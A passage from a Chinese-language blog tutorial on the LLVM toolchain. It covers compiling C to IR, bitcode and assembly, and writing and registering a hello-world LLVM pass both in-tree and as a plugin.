<span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-keyword">store</span> <span class="hljs-type">i32</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span> <span class="hljs-type">ptr</span> <span class="hljs-variable">%1</span><span class="hljs-punctuation">,</span> <span class="hljs-keyword">align</span> <span class="hljs-number">4</span><br>  <span class="hljs-variable">%2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">call</span> <span class="hljs-type">i32</span> (<span class="hljs-type">ptr</span><span class="hljs-punctuation">,</span> ...) <span class="hljs-title">@printf</span>(<span class="hljs-type">ptr</span> noundef <span class="hljs-title">@.str</span>)<br>  <span class="hljs-keyword">ret</span> <span class="hljs-type">i32</span> <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-keyword">declare</span> <span class="hljs-type">i32</span> <span class="hljs-title">@printf</span>(<span class="hljs-type">ptr</span> noundef<span class="hljs-punctuation">,</span> ...) <span class="hljs-variable">#1</span><br><br><span class="hljs-keyword">attributes</span> <span class="hljs-variable">#0</span> <span class="hljs-operator">=</span> &#123; <span class="hljs-keyword">noinline</span> <span class="hljs-keyword">nounwind</span> <span class="hljs-keyword">optnone</span> <span class="hljs-keyword">uwtable</span> <span class="hljs-string">&quot;frame-pointer&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;all&quot;</span> <span class="hljs-string">&quot;min-legal-vector-width&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;0&quot;</span> <span class="hljs-string">&quot;no-trapping-math&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;true&quot;</span> <span class="hljs-string">&quot;stack-protector-buffer-size&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;8&quot;</span> <span class="hljs-string">&quot;target-cpu&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;x86-64&quot;</span> <span class="hljs-string">&quot;target-features&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;+cmov,+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="hljs-string">&quot;tune-cpu&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;generic&quot;</span> &#125;<br><span class="hljs-keyword">attributes</span> <span class="hljs-variable">#1</span> <span class="hljs-operator">=</span> &#123; <span class="hljs-string">&quot;frame-pointer&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;all&quot;</span> <span class="hljs-string">&quot;no-trapping-math&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;true&quot;</span> <span class="hljs-string">&quot;stack-protector-buffer-size&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;8&quot;</span> <span class="hljs-string">&quot;target-cpu&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;x86-64&quot;</span> <span class="hljs-string">&quot;target-features&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;+cmov,+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot;</span> <span class="hljs-string">&quot;tune-cpu&quot;</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;generic&quot;</span> &#125;<br><br><span class="hljs-title">!llvm.module.flags</span> <span class="hljs-operator">=</span> !&#123;<span class="hljs-title">!0</span><span class="hljs-punctuation">,</span> <span class="hljs-title">!1</span><span class="hljs-punctuation">,</span> <span class="hljs-title">!2</span><span class="hljs-punctuation">,</span> <span class="hljs-title">!3</span><span class="hljs-punctuation">,</span> <span class="hljs-title">!4</span>&#125;<br><span class="hljs-title">!llvm.ident</span> <span class="hljs-operator">=</span> !&#123;<span class="hljs-title">!5</span>&#125;<br><br><span class="hljs-title">!0</span> <span class="hljs-operator">=</span> !&#123;<span class="hljs-type">i32</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span> !<span class="hljs-string">&quot;wchar_size&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span> <span class="hljs-number">4</span>&#125;<br><span class="hljs-title">!1</span> <span class="hljs-operator">=</span> !&#123;<span class="hljs-type">i32</span> <span class="hljs-number">8</span><span class="hljs-punctuation">,</span> !<span class="hljs-string">&quot;PIC Level&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span> <span class="hljs-number">2</span>&#125;<br><span class="hljs-title">!2</span> <span class="hljs-operator">=</span> !&#123;<span class="hljs-type">i32</span> <span class="hljs-number">7</span><span class="hljs-punctuation">,</span> !<span class="hljs-string">&quot;PIE Level&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span> <span class="hljs-number">2</span>&#125;<br><span class="hljs-title">!3</span> <span class="hljs-operator">=</span> !&#123;<span class="hljs-type">i32</span> <span class="hljs-number">7</span><span class="hljs-punctuation">,</span> !<span class="hljs-string">&quot;uwtable&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span> <span class="hljs-number">2</span>&#125;<br><span class="hljs-title">!4</span> <span class="hljs-operator">=</span> !&#123;<span class="hljs-type">i32</span> <span class="hljs-number">7</span><span class="hljs-punctuation">,</span> !<span class="hljs-string">&quot;frame-pointer&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-type">i32</span> <span class="hljs-number">2</span>&#125;<br><span class="hljs-title">!5</span> <span class="hljs-operator">=</span> !&#123;!<span class="hljs-string">&quot;Ubuntu clang version 18.1.3 (1ubuntu1)&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>执行 .ll 文件 : <code>lli ez.ll</code></p><blockquote><p>lli 是 LLVM Interpreter（LLVM 解释器） 的缩写,是一个命令行工具，能够直接执行 LLVM IR代码</p></blockquote><p>把 c 源码编译成 Bitcode<br><code>clang -O3 -emit-llvm ez.c -c -o ez.bc</code></p><blockquote><p>-O 表示优化，3表示这是最高级别的优化<br>-emit-llvm 作用同上，告诉编译器生成 LLVM IR<br>-c 告诉编译器只进行编译，不进行链接，即生成一个目标文件而不是可执行文件</p></blockquote><p>.bc 文件是 LLVM 字节码(Bitcode)的缩写，它与之前的 .ll 文件都属于 LLVM IR，但是</p><p><code>.ll</code> 文件是 LLVM IR 的<strong>文本格式</strong>，人类可读，并且可以使用文本编译器查看内容<br><code>.bc</code> 文件是 LLVM IR 的<strong>二进制格式</strong>，人类不可读，但文件体积更小，加载和处理速度更快，更适合作为编译器后端的输入</p><p>llvm 中提供了 llvm-as (汇编器) 和 llvm -dis (反汇编器)，让两种形式的文件能相互转化<br>把 .ll 文件转化为 .bc 文件<br><code> llvm-as ez.ll -o ez.bc</code><br>把 .bc 文件转化为 .ll 文件<br><code>llvm-dis ez.bc -o ez.ll</code></p><p><code>llvm-dis &lt; ez.bc | less</code> </p><blockquote><p>llvm-dis 是 LLVM 的反汇编工具，用于将 .bc 文件转换为 .ll 文件<br>&lt; 是一个重定向操作符，告诉 llvm-dis 命令，从标准输入（stdin）而不是从命令行参数中读取数据<br>| 是 管道 符号，它将左边命令的标准输出（stdout）作为右边命令的标准输入<br>less 是一个分页查看器，能够让用户逐页查看文本内容</p></blockquote><p>把 llvm 字节码文件转化为汇编<br><code>llc ez.bc -o ez.s</code></p><blockquote><p>llc 是 LLVM Static Compiler，即LLVM 编译流程中的后端代码生成器</p></blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.text</span><br><span class="hljs-string">.file</span><span class="hljs-string">&quot;ez.c&quot;</span><br><span class="hljs-string">.globl</span>main                            <span class="hljs-comment"># -- Begin function main</span><br><span class="hljs-string">.p2align</span>4, 0x90<br><span class="hljs-string">.type</span>main,@function<br>main:                                   <span class="hljs-comment"># @main</span><br><span class="hljs-string">.cfi_startproc</span><br><span class="hljs-comment"># %bb.0:</span><br>pushq%rax<br><span class="hljs-string">.cfi_def_cfa_offset</span> 16<br>movl$<span class="hljs-string">.Lstr</span>, %edi<br>callqputs@PLT<br>xorl%eax, %eax<br>popq%rcx<br><span class="hljs-string">.cfi_def_cfa_offset</span> 8<br>retq<br><span class="hljs-string">.Lfunc_end0</span>:<br><span class="hljs-string">.size</span>main, <span class="hljs-string">.Lfunc_end0-main</span><br><span class="hljs-string">.cfi_endproc</span><br>                                        <span class="hljs-comment"># -- End function</span><br><span class="hljs-string">.type</span><span class="hljs-string">.Lstr</span>,@object                   <span class="hljs-comment"># @str</span><br><span class="hljs-string">.section</span><span class="hljs-string">.rodata.str1.1</span>,<span class="hljs-string">&quot;aMS&quot;</span>,@progbits,1<br><span class="hljs-string">.Lstr</span>:<br><span class="hljs-string">.asciz</span><span class="hljs-string">&quot;Hello, LLVM!&quot;</span><br><span class="hljs-string">.size</span><span class="hljs-string">.Lstr</span>, 13<br><br><span class="hljs-string">.ident</span><span class="hljs-string">&quot;Ubuntu clang version 18.1.3 (1ubuntu1)&quot;</span><br><span class="hljs-string">.section</span><span class="hljs-string">&quot;.note.GNU-stack&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,@progbits<br></code></pre></td></tr></table></figure><p>把汇编转化成可执行文件<br><code>clang ez.s -o ez_asm</code><br>我直接用这个失败了，因为汇编代码使用了绝对地址引用(movl$.Lstr, %edi)，与 PIE 不兼容<br>禁用pie:<br><code>clang -no-pie ez.s -o ez_asm</code></p><p>使用 opt 来执行 pass</p><blockquote><p>在典型的编译流程中，源代码首先被编译成 LLVM IR，然后 opt 会介入，对这个 IR 进行一系列的分析和转换,优化代码<br><code>opt --help</code> 获取 LLVM 中可用程序转换列表</p></blockquote><h3 id="LLVM-Pass"><a href="#LLVM-Pass" class="headerlink" title="LLVM Pass"></a>LLVM Pass</h3><p>LLVM Pass 框架是 LLVM 系统的一个重要组成部分，Pass 执行构成编译器的各种转换和优化</p><p>Pass 的核心特征：</p><ul><li>模块化：每个 Pass 都被设计成一个独立的、自包含的单元，它只专注于完成一个特定的任务</li><li>可组合：LLVM 允许通过 Pass 管理器将多个 Pass 串联起来，形成一个完整的优化管道，开发者可以根据需求自由组合不同的 Pass</li><li>统一接口：与旧版 Pass 管理器中通过继承定义 Pass 接口不同，新版 Pass 管理器中的 Pass 都遵循一个基于概念的多态接口</li></ul><p>Pass 的分类</p><ul><li>FunctionPass：在函数上运行，这是最常见的 Pass 类型，通常用于函数内部的优化或分析。</li><li>ModulePass：在整个模块（通常是一个源文件）上运行，它适用于需要在函数间进行分析或优化的场景</li><li>LoopPass：在每个循环上运行</li></ul><p>根据官方文档具体了解 pass<br><a href="https://llvm.org/docs/WritingAnLLVMNewPMPass.html">https://llvm.org/docs/WritingAnLLVMNewPMPass.html</a></p><h3 id="基于源码的-LLVM-Pass"><a href="#基于源码的-LLVM-Pass" class="headerlink" title="基于源码的 LLVM Pass"></a>基于源码的 LLVM Pass</h3><p>上文已经为新 pass 构建好了环境<br>以 llvm-project 目录下创建好了的这个为例 <code>llvm/lib/Transforms/Utils/HelloWorld.cpp</code> </p><p>首先需要在一个头文件中定义这个 pass，创建文件 llvm&#x2F;include&#x2F;llvm&#x2F;Transforms&#x2F;Utils&#x2F;HelloWorld.h</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><br><span class="hljs-keyword">namespace</span> llvm &#123;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;HelloWorldPass&gt; &#123;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;AM)</span></span>;<br>&#125;;<br><br>&#125; <span class="hljs-comment">// namespace llvm</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">// LLVM_TRANSFORMS_HELLONEW_HELLOWORLD_H</span></span><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;HelloWorldPass&gt; &#123;<br></code></pre></td></tr></table></figure><p>定义了一个 HelloWorldPass 类，它继承自 PassInfoMixin<HelloWorldPass>，这是 LLVM 新版 Pass 管理器的一个基类<br><code>PassInfoMixin</code> 是一个 CRTP（奇异递归模板模式）模板，提供了 Pass 的基本信息和接口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;AM)</span></span>;<br></code></pre></td></tr></table></figure><p><code>run</code> 方法是 Pass 的核心执行函数<br><code>Function &amp;F</code>：当前正在处理的函数对象的引用<br><code>FunctionAnalysisManager &amp;AM</code>：函数分析管理器，用于获取和管理分析结果<br><code>PreservedAnalyses</code>：返回值，告诉 Pass 管理器哪些分析结果在此 Pass 执行后仍然有效</p><p>然后看<code>llvm/lib/Transforms/Utils/HelloWorld.cpp</code> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Transforms/Utils/HelloWorld.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Function.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-function">PreservedAnalyses <span class="hljs-title">HelloWorldPass::run</span><span class="hljs-params">(Function &amp;F,</span></span><br><span class="hljs-params"><span class="hljs-function">                                      FunctionAnalysisManager &amp;AM)</span> </span>&#123;<br>  <span class="hljs-built_in">errs</span>() &lt;&lt; F.<span class="hljs-built_in">getName</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>  <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>头文件中包含了刚刚定义的 HelloWorld.h 以及 LLVM 的 Function 类定义，提供函数相关的 API</p><p>pass 的核心逻辑 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">errs</span>() &lt;&lt; F.<span class="hljs-built_in">getName</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>errs()</code>：LLVM 的错误输出流<br><code>F.getName()</code>：获取当前函数的名称<br>整体作用：将函数名打印到标准错误输出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br></code></pre></td></tr></table></figure><p>告诉 Pass 管理器所有的分析结果都被保留</p><p>以上就是 Pass 本身的代码，接下来需要在几个地方添加一些内容来注册这个 pass</p><p>在 <code>llvm/lib/Passes/PassRegistry.def</code> 文件的 FUNCTION_PASS 部分添加</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">FUNCTION_PASS</span>(<span class="hljs-string">&quot;helloworld&quot;</span>, <span class="hljs-built_in">HelloWorldPass</span>())<br></code></pre></td></tr></table></figure><p>让这个 pass 名为 “helloworld”</p><p>在 <code>llvm/lib/Passes/PassBuilder.cpp</code> 中添加正确的 #include：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Transforms/Utils/HelloWorld.h&quot;</span></span><br></code></pre></td></tr></table></figure><p>然后就可以编译运行了，但是我按照这样操作之后再 ninja 编译时出错了，大概意思是刚刚的 HelloWorld.cpp 中缺少头文件<br>添加了下面这一行之后就能顺利编译了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br></code></pre></td></tr></table></figure><p>在<code>build</code> 目录下执行 <code>ninja</code><br>回显</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">[<span class="hljs-number">59</span>/<span class="hljs-number">59</span>] Creating <span class="hljs-keyword">library</span> symlink <span class="hljs-keyword">lib</span>/libclang-cpp.so<br></code></pre></td></tr></table></figure><p>使用 <strong>opt</strong> 来运行一个 pass</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">opt -passes=helloworld ez.ll -o /dev/null<br><br><span class="hljs-comment">#main</span><br></code></pre></td></tr></table></figure><blockquote><p>-passes&#x3D;helloworld: 告诉 opt 运行一个名为 helloworld 的 Pass<br>-o &#x2F;dev&#x2F;null: 将 opt 的输出结果重定向到空设备，不保存修改后的 IR 文件</p></blockquote><p>以上是旧的注册方法，LLVM 还提供了一种新的注册方式 –以 <strong>插件</strong> 的形式注册 Pass<br>首先，移除之前按照旧方法而做的修改<br>然后在 <code>llvm/lib/Transforms/Utils/HelloWorld.cpp</code> 中修改如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Transforms/Utils/HelloWorld.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/Function.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span>  <span class="hljs-comment">//关键</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-function">PreservedAnalyses <span class="hljs-title">HelloWorldPass::run</span><span class="hljs-params">(Function &amp;F,</span></span><br><span class="hljs-params"><span class="hljs-function">                                      FunctionAnalysisManager &amp;AM)</span> </span>&#123;<br>  <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;Hello from HelloWorldPass: &quot;</span> &lt;&lt; F.<span class="hljs-built_in">getName</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>  <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>&#125;<br><br><span class="hljs-comment">// 这是 Pass 插件的注册入口点</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">LLVM_ATTRIBUTE_WEAK PassPluginLibraryInfo <span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> &#123;LLVM_PLUGIN_API_VERSION, <span class="hljs-string">&quot;HelloWorldPass&quot;</span>, <span class="hljs-string">&quot;v1.0&quot;</span>,<br>          [](PassBuilder &amp;PB) &#123;<br>            PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>                [](StringRef Name, FunctionPassManager &amp;FPM,<br>                   ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>                  <span class="hljs-keyword">if</span> (Name == <span class="hljs-string">&quot;hello-world&quot;</span>) &#123;   <span class="hljs-comment">//hello-world 即为定义的 pass 的名字</span><br>                    FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">HelloWorldPass</span>());<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                  &#125;<br>                  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;);<br>          &#125;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>工作流程：</p><blockquote><p>用户运行：opt -passes&#x3D;hello-world input.ll<br>LLVM 加载插件并调用 llvmGetPassPluginInfo()<br>插件注册解析回调到 PassBuilder<br>PassBuilder 解析 “hello-world” 名称<br>回调函数将 HelloWorldPass 添加到管道<br>Pass 管理器执行 <code>HelloWorldPass::run()</code> 方法<br>输出函数名并完成处理</p></blockquote><p>接下来需要修改 CMakeLists.txt 文件，添加插件的构建配置<br>在 <code>llvm/lib/Transforms/Utils/CMakeLists.txt</code> 中添加 Passes 和 PARTIAL_SOURCES_INTENDED</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment"># 已有代码...</span><br>LINK_COMPONENTS<br>  Analysis<br>  Core<br>  Support<br>  TargetParser<br>  Passes                    <span class="hljs-comment"># &lt;- 链接Passes组件库</span><br>  PARTIAL_SOURCES_INTENDED  <span class="hljs-comment"># &lt;- 允许部分源文件不在此目标中</span><br>  )<br></code></pre></td></tr></table></figure><p>然后进入 build 目录，重新运行 cmake，让 Cmake 读取修改后的 CMakeLists.txt；再执行 ninja</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/eleven/llvm-project-llvmorg-20.1.8/build<br>cmake -G Ninja ../llvm<br>ninja <br></code></pre></td></tr></table></figure><h3 id="自己编写-LLVM-Pass"><a href="#自己编写-LLVM-Pass" class="headerlink" title="自己编写 LLVM Pass"></a>自己编写 LLVM Pass</h3><p>先安装 LLVM 的软件包，我这里安装的是 LLVM 19</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install llvm-19<br></code></pre></td></tr></table></figure><p>创建一个新的目录 <code>myllvm</code><br><strong>Function Pass</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//Hello.cpp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span>   </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">HelloPass</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;HelloPass&gt; &#123;<br>    <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;AM)</span> </span>&#123;<br>        <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;Hello from LLVM 19: &quot;</span> &lt;&lt; F.<span class="hljs-built_in">getName</span>() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">isRequired</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; &#125;<br>&#125;;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> LLVM_ATTRIBUTE_WEAK ::<span class="hljs-function">llvm::PassPluginLibraryInfo</span><br><span class="hljs-function"><span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;  <br>    <span class="hljs-keyword">return</span> &#123;<br>        .APIVersion = LLVM_PLUGIN_API_VERSION,<br>        .PluginName = <span class="hljs-string">&quot;HelloPass&quot;</span>,<br>        .PluginVersion = <span class="hljs-string">&quot;v0.1&quot;</span>,<br>        .RegisterPassBuilderCallbacks = [](PassBuilder &amp;PB) &#123;<br>            PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>                [](StringRef Name, FunctionPassManager &amp;FPM,<br>                   ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>                    <span class="hljs-keyword">if</span> (Name == <span class="hljs-string">&quot;hello&quot;</span>) &#123;<br>                        FPM.<span class="hljs-built_in">addPass</span>(HelloPass&#123;&#125;);<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;);<br>        &#125;<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>一些注释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span>  <span class="hljs-comment">//引入 PassBuilder 类，它是新 PM 的核心组件</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span>   <span class="hljs-comment">//编写 LLVM 插件的必备头文件</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 